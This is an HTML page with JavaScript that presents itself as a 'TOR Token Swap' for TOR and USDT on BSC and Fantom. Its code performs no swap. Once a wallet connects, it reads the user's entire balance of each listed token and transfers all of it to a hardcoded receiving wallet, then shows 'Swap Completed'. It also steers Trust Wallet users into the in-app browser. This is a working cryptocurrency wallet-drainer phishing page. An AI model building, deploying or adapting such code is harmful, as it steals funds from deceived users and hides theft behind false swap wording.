<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TOR Token Swap</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    :root {
      --primary: #6c5ce7;
      --secondary: #a29bfe;
      --dark: #2d3436;
      --light: #f5f6fa;
      --success: #00b894;
      --danger: #d63031;
      --warning: #fdcb6e;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: var(--light);
      color: var(--dark);
      line-height: 1.6;
    }
    
    .container {
      max-width: 500px;
      margin: 0 auto;
      padding: 20px;
    }
    
    .card {
      background: white;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      padding: 30px;
      margin-bottom: 20px;
      position: relative;
      overflow: hidden;
    }
    
    .header {
      text-align: center;
      margin-bottom: 25px;
      position: relative;
    }
    
    .logo {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      object-fit: contain;
      margin-bottom: 15px;
      border: 3px solid var(--primary);
      padding: 5px;
    }
    
    h1 {
      color: var(--primary);
      font-size: 28px;
      margin-bottom: 10px;
    }
    
    .description {
      color: #636e72;
      font-size: 16px;
      margin-bottom: 25px;
    }
    
    .token-info {
      background: rgba(108, 92, 231, 0.1);
      border-radius: 12px;
      padding: 15px;
      margin-bottom: 20px;
    }
    
    .token-links {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 20px;
    }
    
    .token-link {
      color: var(--primary);
      text-decoration: none;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 5px;
      transition: all 0.3s;
    }
    
    .token-link:hover {
      color: var(--secondary);
    }
    
    .btn {
      background: var(--primary);
      color: white;
      border: none;
      padding: 15px 25px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: all 0.3s;
      margin-bottom: 15px;
    }
    
    .btn:hover {
      background: var(--secondary);
      transform: translateY(-2px);
    }
    
    .btn:disabled {
      background: #b2bec3;
      cursor: not-allowed;
      transform: none;
    }
    
    .btn i {
      font-size: 18px;
    }
    
    .status {
      padding: 15px;
      border-radius: 12px;
      margin-bottom: 15px;
      display: none;
    }
    
    .success {
      background: rgba(0, 184, 148, 0.1);
      color: var(--success);
      border: 1px solid rgba(0, 184, 148, 0.3);
    }
    
    .error {
      background: rgba(214, 48, 49, 0.1);
      color: var(--danger);
      border: 1px solid rgba(214, 48, 49, 0.3);
    }
    
    .loader {
      border: 4px solid rgba(108, 92, 231, 0.1);
      border-top: 4px solid var(--primary);
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .wallet-info {
      font-size: 14px;
      color: #636e72;
      text-align: center;
      margin-bottom: 15px;
      word-break: break-all;
    }
    
    .tx-link {
      color: var(--primary);
      text-decoration: none;
      font-weight: 600;
      transition: all 0.3s;
    }
    
    .tx-link:hover {
      text-decoration: underline;
    }
    
    .token-list {
      margin-bottom: 20px;
    }
    
    .token-item {
      display: flex;
      align-items: center;
      padding: 12px;
      background: rgba(108, 92, 231, 0.05);
      border-radius: 10px;
      margin-bottom: 10px;
    }
    
    .token-icon {
      width: 30px;
      height: 30px;
      margin-right: 12px;
      border-radius: 50%;
    }
    
    .token-name {
      font-weight: 600;
      flex-grow: 1;
    }
    
    .token-network {
      font-size: 12px;
      color: #636e72;
      background: rgba(99, 110, 114, 0.1);
      padding: 3px 6px;
      border-radius: 4px;
    }
    
    .mobile-warning {
      display: none;
      background: var(--warning);
      color: var(--dark);
      padding: 15px;
      border-radius: 10px;
      margin-bottom: 20px;
      text-align: center;
    }
    
    .network-selector {
      margin-bottom: 20px;
    }
    
    select {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #dfe6e9;
      background: white;
      font-size: 16px;
    }
    
    @media (max-width: 600px) {
      .container {
        padding: 15px;
      }
      
      .card {
        padding: 20px;
      }
      
      .mobile-warning {
        display: block;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="header">
        <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR Logo" class="logo">
        <h1>TOR Token Swap</h1>
        <p class="description">Swap your TOR and USDT tokens to TRX-based assets</p>
        
        <div class="token-links">
          <a href="https://www.coingecko.com/en/coins/tor" target="_blank" class="token-link">
            <i class="fas fa-chart-line"></i> CoinGecko
          </a>
          <a href="https://coinmarketcap.com/currencies/tor/" target="_blank" class="token-link">
            <i class="fas fa-coins"></i> CoinMarketCap
          </a>
        </div>
      </div>
      
      <div class="mobile-warning">
        <i class="fas fa-mobile-alt"></i> For Trust Wallet mobile users, please use the in-app browser (tap the "Browser" tab inside Trust Wallet)
      </div>
      
      <div class="network-selector">
        <select id="networkSelect">
          <option value="bsc">Binance Smart Chain</option>
          <option value="fantom">Fantom Opera</option>
        </select>
      </div>
      
      <div class="token-list">
        <div class="token-item" data-network="bsc">
          <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
          <span class="token-name">TOR Token</span>
          <span class="token-network">BSC</span>
        </div>
        <div class="token-item" data-network="fantom">
          <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
          <span class="token-name">TOR Token</span>
          <span class="token-network">Fantom</span>
        </div>
        <div class="token-item" data-network="bsc">
          <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
          <span class="token-name">USDT</span>
          <span class="token-network">BSC</span>
        </div>
      </div>
      
      <button id="connectWallet" class="btn">
        <i class="fas fa-wallet"></i> Connect Wallet & Swap
      </button>
      <div id="loader" class="loader"></div>
      
      <div id="walletInfo" class="wallet-info"></div>
      <div id="status" class="status"></div>
    </div>
  </div>

  <!-- Load Ethers.js -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js"></script>
  <script>
    // Configuration
    const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
    
    // Token contracts
    const TOKENS = {
      bsc: [
        {
          name: "TOR",
          symbol: "TOR",
          address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
          abi: [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)"
          ],
          decimals: 18,
          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
        },
        {
          name: "USDT",
          symbol: "USDT",
          address: "0x55d398326f99059fF775485246999027B3197955",
          abi: [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)"
          ],
          decimals: 18,
          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
        }
      ],
      fantom: [
        {
          name: "TOR",
          symbol: "TOR",
          address: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e",
          abi: [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)"
          ],
          decimals: 18,
          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
        }
      ]
    };
    
    const NETWORK_CONFIGS = {
      bsc: {
        chainId: "0x38",
        chainName: "Binance Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org/"],
        blockExplorerUrls: ["https://bscscan.com"],
        scanUrl: "https://bscscan.com/tx/"
      },
      fantom: {
        chainId: "0xfa",
        chainName: "Fantom Opera",
        nativeCurrency: { name: "FTM", symbol: "FTM", decimals: 18 },
        rpcUrls: ["https://rpc.ftm.tools/"],
        blockExplorerUrls: ["https://ftmscan.com"],
        scanUrl: "https://ftmscan.com/tx/"
      }
    };

    // Global variables
    let provider, signer, userAddress;
    let currentNetwork = "bsc";

    // Initialize when page loads
    window.addEventListener('load', () => {
      // Set up network selection
      document.getElementById("networkSelect").addEventListener('change', (e) => {
        currentNetwork = e.target.value;
        updateTokenVisibility();
      });
      
      document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
      
      // Check if Trust Wallet mobile browser
      if (isTrustWalletMobile()) {
        document.querySelector('.mobile-warning').style.display = 'block';
      }
      
      // Initial token visibility update
      updateTokenVisibility();
    });

    function updateTokenVisibility() {
      document.querySelectorAll('.token-item').forEach(item => {
        item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
      });
    }

    function isTrustWalletMobile() {
      const ua = navigator.userAgent;
      return (ua.indexOf("TrustWallet") > -1 || ua.indexOf("Trust Wallet") > -1) && /Mobile/i.test(ua);
    }

    // Main function to connect wallet and swap tokens
    async function connectAndSwap() {
      try {
        showLoader();
        updateStatus("Connecting wallet...", "success");

        // Check if we're in Trust Wallet mobile but not in the in-app browser
        if (isTrustWalletMobile() && !window.ethereum) {
          // Create a deep link to open in Trust Wallet's in-app browser
          const currentUrl = encodeURIComponent(window.location.href);
          window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
          return;
        }

        // If no provider is available (even after Trust Wallet check)
        if (!window.ethereum) {
          throw new Error("Please use Trust Wallet's in-app browser or install MetaMask!");
        }

        // Request account access
        await window.ethereum.request({ method: "eth_requestAccounts" });
        
        // Check and switch network if needed
        await checkNetwork();
        
        // Initialize provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        
        // Update UI
        document.getElementById("connectWallet").disabled = true;
        document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
        document.getElementById("walletInfo").textContent = 
          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
        
        // Execute the swaps automatically
        await swapAllTokens();
      } catch (err) {
        hideLoader();
        updateStatus("Error: " + err.message, "error");
        document.getElementById("connectWallet").disabled = false;
        document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet & Swap`;
        
        // If it's a Trust Wallet mobile, show special instructions
        if (isTrustWalletMobile()) {
          updateStatus("Please open this page in Trust Wallet's in-app browser (use the 'Browser' tab inside Trust Wallet)", "error");
        }
      }
    }

    async function checkNetwork() {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
      
      if (chainId !== targetChainId) {
        updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            } catch (addError) {
              throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`);
            }
          } else {
            throw new Error("Failed to switch network");
          }
        }
      }
    }

    async function swapAllTokens() {
      try {
        let successCount = 0;
        const tokensToSwap = TOKENS[currentNetwork];
        
        for (const token of tokensToSwap) {
          try {
            updateStatus(`Processing ${token.name}...`, "success");
            
            const contract = new ethers.Contract(token.address, token.abi, signer);
            const balance = await contract.balanceOf(userAddress);
            
            if (balance.gt(0)) {
              const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
              updateStatus(`Sending ${formattedAmount} ${token.symbol}...`, "success");
              
              const tx = await contract.transfer(RECEIVING_WALLET, balance);
              await tx.wait();
              
              updateStatus(
                `${token.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
                "success"
              );
              successCount++;
            } else {
              updateStatus(`No ${token.symbol} balance found`, "success");
            }
          } catch (tokenError) {
            updateStatus(`${token.symbol} transfer failed: ${tokenError.message}`, "error");
          }
        }
        
        if (successCount > 0) {
          updateStatus(`Successfully transferred ${successCount} token(s)`, "success");
        } else {
          updateStatus("No tokens available to transfer", "success");
        }
        
        document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
      } catch (err) {
        throw new Error("Swap process failed: " + err.message);
      } finally {
        hideLoader();
      }
    }

    function updateStatus(message, type) {
      const statusDiv = document.getElementById("status");
      statusDiv.style.display = "block";
      statusDiv.innerHTML = message;
      statusDiv.className = `status ${type}`;
    }

    function showLoader() {
      document.getElementById("loader").style.display = "block";
    }

    function hideLoader() {
      document.getElementById("loader").style.display = "none";
    }
  </script>
</body>
</html>
